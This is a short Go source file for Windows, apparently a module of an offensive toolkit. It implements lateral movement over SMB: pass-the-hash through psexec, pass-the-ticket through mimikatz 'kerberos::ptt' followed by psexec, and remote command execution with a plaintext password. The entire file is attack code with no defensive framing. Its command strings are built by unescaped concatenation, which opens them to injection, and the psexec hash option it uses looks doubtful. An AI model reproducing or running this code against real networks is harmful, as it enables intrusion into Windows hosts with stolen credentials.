//go:build windows

package smb

import (
"os/exec"
)

func SMBPassTheHash(targetHost, username, hash, command string) bool {
cmd := exec.Command("cmd", "/c", "psexec \\\\"+targetHost+" -u "+username+" -H "+hash+" "+command)
err := cmd.Run()
if err != nil {
return false
}
return true
}

func SMBPassTheTicket(targetHost, ticketPath, command string) bool {
cmd := exec.Command("cmd", "/c", "mimikatz.exe \"kerberos::ptt "+ticketPath+"\" exit")
err := cmd.Run()
if err != nil {
return false
}
cmd = exec.Command("cmd", "/c", "psexec \\\\"+targetHost+" "+command)
err = cmd.Run()
if err != nil {
return false
}
return true
}

func SMBExecuteCommand(targetHost, username, password, command string) bool {
cmd := exec.Command("cmd", "/c", "psexec \\\\"+targetHost+" -u "+username+" -p "+password+" "+command)
err := cmd.Run()
if err != nil {
return false
}
return true
}
